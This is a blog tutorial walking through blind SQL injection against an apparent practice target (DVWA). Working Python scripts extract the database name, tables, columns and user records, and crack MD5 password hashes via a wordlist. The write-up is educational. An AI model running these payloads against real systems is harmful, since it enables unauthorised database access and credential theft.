---
title: Blind SQL Injection
description: How to exploit blind sql injection vulnerability.
author: Kalidou DIA
date: 2024-02-29
img: /img/sql_blind/sql_blind.webp
updated: Feb, 29 2024
read: 8
border: border-gray-700
tags:
  - 
    name: Hack
    class: bg-gray-400 hover:bg-red-800
  - 
    name: Python
    class: bg-gray-600 hover:bg-teal-700
---

# <center>BLIND SQL INJECTION </center>

![alt text](/img/sql_blind/sql_blind.webp#center)



### <center>How to hack website using blind sql injection vulnerability ?</center>


<div style="text-align: right" class="date-update">
Last update :  Feb, 29 2024
</div>


----------------------------------------------------------------
## A . Context

It is about how to exploit the "blind sql injection" vulnerability to get information from the database. 
We have a website with a lot of vulnerabilities. This website is used as a testing and exploitation environment for many vulnerabilities.
In this section we are going to exploit the **SQL INJECTION (blind)** vulnerability. 
- In the image below, we can see the return from the server when we give an integer as input. The server replies that the user with ID "2" exists in the database and nothing else.
    
    ![static user 2](/img/sql_blind/user2.png#center)

- When we enter an incorrect value ('coucou' for example), the server tells us that the user does not exist in the database.
  
    ![static coucou](/img/sql_blind/coucou.png#center)

- Now when we test the sql injection by putting ``coucou' OR 1=1 -- - ``, the server tells us that the user exists in the database. **Which is abnormal**.

    ![alt text](/img/sql_blind/coucouOR.png#center)


___
## B. Deduction
A BLIND SQl INJECTION vulnerability is present and the server provides only two responses: 
 - a. The user exists in the database
 - b. The user does not exist in the database
<br>

We  suspect that there is a return condition somewhere in the server-side processing, which is poorly implemented. And that's what we're going to exploit to find the contents of the database.


________________________________
## C. Exploitation

```python
import requests

cookies = {
    # Cookies
}

headers = {
    # headers
}

url = "http://vulnerable.website"
```
<br>

**Function that allows us to perform brute force with python**
```python
def send_request_with_wordlist(path_to_wordlist, beginnig_of_sql_request, end_of_sql_request):
    info_found = []
    wordlist = open(path_to_wordlist, 'r')
    lines = wordlist.readlines()
    for line in lines:
        id_param = beginnig_of_sql_request  + line.strip() + end_of_sql_request
        params = {
            'id': id_param,
            'Submit': 'Submit'
        }
        response = requests.get(url,params=params,cookies=cookies,headers=headers)
        if response.status_code == 200:
            print("[FOUND] = ", line.strip())
            info_found.append(line.strip())
    
    return info_found
```
<br>
<br>

### 1. Information of the Database

We're going to find out which database we're dealing with: Mysql, PostgreSQL, Oracle, MariaDB, etc. To do this, we'll create a list of the most commonly used SQL databases. 
Let's use the **@@version** or **version()** variable to find this DB info.


```python
paramID = "' or LOWER(@@version) LIKE '%"
shorlist = "wordlist/infoDB.txt"

info_DB = send_request_with_wordlist(shorlist, paramID, "%' -- -")
info_DB
```
```

    [FOUND] =  db
    [FOUND] =  maria
    [FOUND] =  mariadb

    ['db', 'maria', 'mariadb']
```


We now know that this is a mariaDB.

### 2. Name of the database

#### 2.1 First, let's find the letters that make up the database being queried


```python
alphabet = "wordlist/alphabet_num.txt"
sql_start = "' or DATABASE() LIKE  '%"
sql_end = "%' -- -"
letters_in_db_name = []
letters_in_db_name = send_request_with_wordlist(alphabet, sql_start, sql_end)


print("Characters used in the database name : ", "".join(str(i) for i in letters_in_db_name))
```

    [FOUND] =  a
    [FOUND] =  d
    [FOUND] =  v
    [FOUND] =  w
    Characters used in the database name:  advw


#### 2.2 Let's find the permutations of these letters

```python
from itertools import permutations

chaine = "".join(str(i) for i in letters_in_db_name)
# Fonction pour trouver les permutations d'une chaîne de caractères
def find_permutations(chaine):
    resultat = permutations(chaine)
    permutations_list = [''.join(perm) for perm in resultat]
    return permutations_list

permutations_chaine = find_permutations(chaine)
print(permutations_chaine)
```

    ['advw', 'adwv', 'avdw', 'avwd', 'awdv', 'awvd', 'davw', 'dawv', 'dvaw', 'dvwa', 'dwav', 'dwva', 'vadw', 'vawd', 'vdaw', 'vdwa', 'vwad', 'vwda', 'wadv', 'wavd', 'wdav', 'wdva', 'wvad', 'wvda']


#### 2.3 Let's find the real name of the database

```python
db_name = ""
id_param = "' or DATABASE() LIKE  '"

for elem in permutations_chaine:
    params = {
        'id': id_param+elem+"' -- -",
        'Submit': 'Submit', 
    }
    response = requests.get(url,params=params,cookies=cookies,headers=headers)
    if response.status_code == 200:
        db_name = elem
        break #on arrête la boucle dès qu'on trouve le nom

print("The name of the database queried is : "+db_name)
```

    The name of the database queried is : dvwa


### 3. Database tables

To find the tables in the **'dvwa'** DB, we'll use a wordlist of the most common table names.
The wordlist has been downloaded from  ==> https://github.com/drtychai/wordlists/blob/master/sqlmap/common-outputs.txt


```python
tables_wordlist = open('wordlist/tables.txt', 'r')
Lines = tables_wordlist.readlines()
tables_found = []

wordlist_of_tables = "wordlist/tables.txt"
sql_start = "' or EXISTS ( SELECT 1 FROM information_schema.tables WHERE table_schema = '"+ db_name +"' AND table_name LIKE '"
sql_end = "') -- -"
tables_found = send_request_with_wordlist(wordlist_of_tables, sql_start, sql_end)
tables_found
```

    [FOUND] =  users
    [FOUND] =  User_
    [FOUND] =  Users
    [FOUND] =  guestbook

    ['users', 'User_', 'Users', 'guestbook']



### 4. Columns in the "users" table

To find the columns in the 'users' table, we'll use a wordlist of the most common column names.
The wordlist has been downloaded from  ==> https://github.com/drtychai/wordlists/blob/master/sqlmap/common-columns.txt


```python
columns_found = []
wordlist_of_columns = "wordlist/colonnes.txt"
sql_start = "' OR EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = 'dvwa'  AND table_name = 'users' AND column_name = '"
sql_end = "') -- -"
columns_found = send_request_with_wordlist(wordlist_of_columns, sql_start, sql_end)

print("columns found in the users table are : ")
print(columns_found)
```

    [FOUND] =  user_id
    [FOUND] =  first_name
    [FOUND] =  last_name
    [FOUND] =  password
    [FOUND] =  user
    [FOUND] =  last_login
    [FOUND] =  user_id
    [FOUND] =  password
    [FOUND] =  user
    [FOUND] =  avatar
    columns found in the users table are : 
    ['user_id', 'first_name', 'last_name', 'password', 'user', 'last_login', 'user_id', 'password', 'user', 'avatar']



```python
list_columns_found = list(set(columns_found))
print("List of columns found : ")
print(list_columns_found)
```

    List of columns found : 
    ['user', 'user_id', 'password', 'last_login', 'first_name', 'last_name', 'avatar']


### 5. Records in the users table


```python
line_count = 0
for i in range(0, 100): 
    id_param = "' OR "+str(i)+ " IN (SELECT COUNT(*) FROM users)  -- -"
    params = {
        'id': id_param,
        'Submit': 'Submit',
    }
    response = requests.get(url,params=params,cookies=cookies,headers=headers)
    if response.status_code == 200:
        line_count = i
        break
print("Number of records in users table = ", line_count)
```

    Number of records in users table =  5


#### 5.1 Let's extract the first_name from the users table


```python
wordlist_first_name = "wordlist/username.txt"
sql_start = "' OR '"
sql_end = "' IN (SELECT first_name FROM users) -- -"

list_of_first_name = send_request_with_wordlist(wordlist_first_name, sql_start, sql_end)
print(list_of_first_name)
```

    [FOUND] =  admin
    [FOUND] =  Pablo
    [FOUND] =  Gordon
    [FOUND] =  hack
    [FOUND] =  bob
    ['admin', 'Pablo', 'Gordon', 'hack', 'bob']


#### 5.2 last_name of the users table


```python
wordlist_last_name = "wordlist/username.txt"
sql_start = "' OR '"
sql_end = "' IN (SELECT last_name FROM users) -- -"

list_of_last_name = send_request_with_wordlist(wordlist_last_name, sql_start, sql_end)
print(list_of_last_name)
```

    [FOUND] =  admin
    [FOUND] =  brown
    [FOUND] =  smith
    [FOUND] =  picasso
    [FOUND] =  me
    ['admin', 'brown', 'smith', 'picasso', 'me']


#### 5.3 User column info


```python
wordlist_user = "wordlist/username.txt"
sql_start = "' OR '"
sql_end = "' IN (SELECT user FROM users) -- -"

list_of_user = send_request_with_wordlist(wordlist_user, sql_start, sql_end)
print(list_of_user)
```

    [FOUND] =  admin
    [FOUND] =  Pablo
    ['admin', 'Pablo']


#### 5.4 Info in the password column

##### 5.4.1 Let's see if the passwords are hashed or not.
To do this, we are going to check the size of the passwords. If all the passwords have the same size, then they are hashed.


```python
for i in range(0, 100): 
    id_param = "' OR "+str(i)+ " IN (SELECT LENGTH(password) FROM users)  -- -"
    params = {
        'id': id_param,
        'Submit': 'Submit',
    }
    response = requests.get(url,params=params,cookies=cookies,headers=headers)
    if response.status_code == 200:
        print("[PASSWORD.LENGTH.FOUND] = ", i)
```

    [PASSWORD.LENGTH.FOUND] =  32


All the passwords seem to have the same size: 32, so we can deduce that they are hashed.

And 32 makes us think of MD5. So brute force

##### 5.4.2 Let's try to crack passwords with a wordlist 


```python
import hashlib

def hash_md5(chaine):
    chaine_bytes = chaine.encode('utf-8')
    
    h = hashlib.md5()
    h.update(chaine_bytes)
    hash_md5 = h.hexdigest()
    
    return hash_md5
```


```python
passwords_found = []
wordlist_password = open("wordlist/password.txt", 'r')
Lines = wordlist_password.readlines()
sql_start = "' OR '"
sql_end ="' IN (SELECT password FROM users ) -- -"


for line in Lines:
    string_hashed = hash_md5(line.strip())
    id_param = sql_start  + string_hashed + sql_end
    params = {
        'id': id_param,
        'Submit': 'Submit'
    }
    response = requests.get(url,params=params,cookies=cookies,headers=headers)
    if response.status_code == 200:
        print("[PASSWORD.FOUND] = ", line.strip())
        passwords_found.append(line.strip())

passwords_found
```

    [PASSWORD.FOUND] =  password
    [PASSWORD.FOUND] =  abc123
    [PASSWORD.FOUND] =  letmein
    [PASSWORD.FOUND] =  charley

    ['password', 'abc123', 'letmein', 'charley']



```python
print(" ---------- Database info --------- " )
print("Name of the database: ", db_name)
print("Database tables :", tables_found)

print("\n")
print(" ---------- Information retrieved from the users table --------- " )
print("first_name :\t", list_of_first_name)
print("last_name :\t", list_of_last_name)
print("user :\t\t", list_of_user)
print("password :\t", passwords_found)

```

     ---------- Database info --------- 
    Name of the database:  dvwa
    Database tables : ['users', 'User_', 'Users', 'guestbook']
    
    
     ---------- Information retrieved from the users table --------- 
    first_name :	 ['admin', 'Pablo', 'Gordon', 'hack', 'bob']
    last_name :	 ['admin', 'brown', 'smith', 'picasso', 'me']
    user :		 ['admin', 'Pablo']
    password :	 ['password', 'abc123', 'letmein', 'charley']

